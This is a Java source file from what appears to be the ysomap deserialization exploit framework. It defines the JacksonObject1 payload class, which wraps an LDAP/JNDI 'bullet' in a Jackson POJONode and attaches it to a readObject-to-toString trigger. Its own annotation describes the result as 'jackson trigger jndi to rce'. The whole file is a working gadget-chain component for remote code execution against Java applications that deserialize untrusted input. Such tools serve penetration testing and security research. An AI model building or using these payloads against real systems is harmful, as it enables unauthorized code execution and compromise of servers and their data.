package ysomap.payloads.java.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

/**
 * @author whocansee
 * @since 2023/10/7
 * https://xz.aliyun.com/t/12846
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee })
@Targets({Targets.JDK})
@Require(bullets = {"LdapAttributeBullet"}, param = false)
@Dependencies({"jackson"})
@Details("jackson trigger jndi to rce")
public class JacksonObject1 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        POJONode node = new POJONode(obj);
        return PayloadHelper.makeReadObjectToStringTrigger(node);
    }
}